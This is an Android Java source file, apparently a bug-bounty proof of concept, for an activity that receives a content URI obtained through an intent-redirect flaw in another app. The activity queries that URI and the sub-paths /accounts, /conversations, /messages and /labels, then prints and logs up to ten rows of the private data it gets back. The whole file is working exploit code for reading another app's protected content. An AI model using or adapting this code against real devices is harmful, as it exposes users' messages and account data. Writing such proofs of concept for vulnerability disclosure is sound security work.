package com.vrppoc;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class UriReceiver extends Activity {
    private static final String TAG = "VRP_POC_RECEIVER";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView tv = findViewById(R.id.tv_results);

        StringBuilder sb = new StringBuilder();
        sb.append("=== URI Receiver Activity ===\n");
        sb.append("UID: " + android.os.Process.myUid() + "\n");

        Uri data = getIntent().getData();
        sb.append("Intent Data URI: " + data + "\n");
        sb.append("Flags: 0x" + Integer.toHexString(getIntent().getFlags()) + "\n\n");

        if (data != null) {
            Log.d(TAG, "Received URI: " + data);
            Log.d(TAG, "Intent flags: 0x" + Integer.toHexString(getIntent().getFlags()));

            ContentResolver cr = getContentResolver();

            // Try to query the granted URI
            try {
                Cursor c = cr.query(data, null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    String[] cols = c.getColumnNames();
                    sb.append("[SUCCESS!] Query returned " + count + " rows!\n");
                    sb.append("Columns: ");
                    for (String col : cols) sb.append(col + ", ");
                    sb.append("\n\n");

                    Log.d(TAG, "[SUCCESS] Query returned " + count + " rows!");
                    Log.d(TAG, "Columns: " + String.join(", ", cols));

                    if (count > 0) {
                        c.moveToFirst();
                        int shown = 0;
                        do {
                            StringBuilder row = new StringBuilder();
                            for (int i = 0; i < cols.length && i < 8; i++) {
                                try {
                                    String val = c.getString(i);
                                    if (val != null && val.length() > 80)
                                        val = val.substring(0, 80) + "...";
                                    row.append(cols[i] + "=" + val + " | ");
                                } catch (Exception e) {
                                    row.append(cols[i] + "=? | ");
                                }
                            }
                            String rowStr = row.toString();
                            sb.append("Row " + shown + ": " + rowStr + "\n");
                            Log.d(TAG, "Row " + shown + ": " + rowStr);
                            shown++;
                        } while (c.moveToNext() && shown < 10);

                        if (count > 10)
                            sb.append("... and " + (count - 10) + " more rows\n");
                    }
                    c.close();
                } else {
                    sb.append("[NULL] Query returned null cursor\n");
                    Log.d(TAG, "Query returned null cursor");
                }
            } catch (SecurityException e) {
                sb.append("[BLOCKED] SecurityException: " + e.getMessage() + "\n");
                Log.d(TAG, "[BLOCKED] " + e.getMessage());
            } catch (Exception e) {
                sb.append("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage() + "\n");
                Log.d(TAG, "[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
            }

            // Also try sub-paths
            String[] subPaths = {"/accounts", "/conversations", "/messages", "/labels"};
            for (String path : subPaths) {
                try {
                    Uri subUri = Uri.parse(data.toString() + path);
                    Cursor c = cr.query(subUri, null, null, null, null);
                    if (c != null) {
                        sb.append("[DATA] " + path + " => " + c.getCount() + " rows\n");
                        Log.d(TAG, "[DATA] " + path + " => " + c.getCount() + " rows");
                        if (c.getCount() > 0) {
                            c.moveToFirst();
                            String[] cols = c.getColumnNames();
                            for (int i = 0; i < cols.length && i < 5; i++) {
                                try {
                                    String val = c.getString(i);
                                    if (val != null && val.length() > 60)
                                        val = val.substring(0, 60) + "...";
                                    sb.append("  " + cols[i] + "=" + val + "\n");
                                    Log.d(TAG, "  " + cols[i] + "=" + val);
                                } catch (Exception e2) {}
                            }
                        }
                        c.close();
                    }
                } catch (SecurityException e) {
                    sb.append("[BLOCKED] " + path + ": SecurityException\n");
                } catch (Exception e) {
                    sb.append("[ERROR] " + path + ": " + e.getClass().getSimpleName() + "\n");
                }
            }
        } else {
            sb.append("No data URI received\n");
            Log.d(TAG, "No data URI received");

            // The intent redirect worked if we got here!
            sb.append("\n[REDIRECT CONFIRMED] This non-exported activity was launched!\n");
            Log.d(TAG, "[REDIRECT CONFIRMED] Activity launched via intent redirect");
        }

        tv.setText(sb.toString());
    }
}
